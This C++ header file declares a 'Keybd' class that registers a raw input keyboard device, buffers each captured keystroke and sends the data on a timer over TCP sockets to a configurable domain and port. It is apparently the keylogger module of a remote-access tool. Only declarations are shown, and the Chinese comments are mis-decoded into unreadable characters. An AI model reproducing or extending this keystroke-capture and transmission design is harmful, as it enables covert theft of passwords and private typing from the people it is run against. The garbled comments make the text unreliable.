// ͨ������ԭʼ�����豸��Ϣ
// ��ȡ�������� ������hunter��

#pragma once
#include "TcpSocket.h"
#include <vector>
class Keybd
{
public:
	Keybd();
	~Keybd();

	// ������ں���
	static void startKeybd(std::string domain, int port);

	// �����̴߳����Ի�����ԭʼ�����豸��Ϣ
	static void createDialogByNewThread();
	static DWORD WINAPI threadProc(LPVOID args);
	static BOOL WINAPI keybdWndProc(HWND hWnd, UINT uiMsg, WPARAM wParam, LPARAM lParam);

	static void CALLBACK sendKeybdData(HWND hWnd, UINT uiMsg, UINT uiTimer, DWORD dwTimer);

	// ���»�ɾ��socket��������
	static void addSocket(TcpSocket* sock);
	static std::vector<TcpSocket*> getSockets();
	static void delSocket(TcpSocket* sock);
	static void addBuffer(char data);
	static void delBuffer();


	// ע��ԭʼ�����豸
	static BOOL regist();
	// ��ȡ�������ݲ��������໺����
	static BOOL getKeybdData(LPARAM lParam);
	// ���水����Ϣ���໺����
	static void saveKey(USHORT usVKey);
};
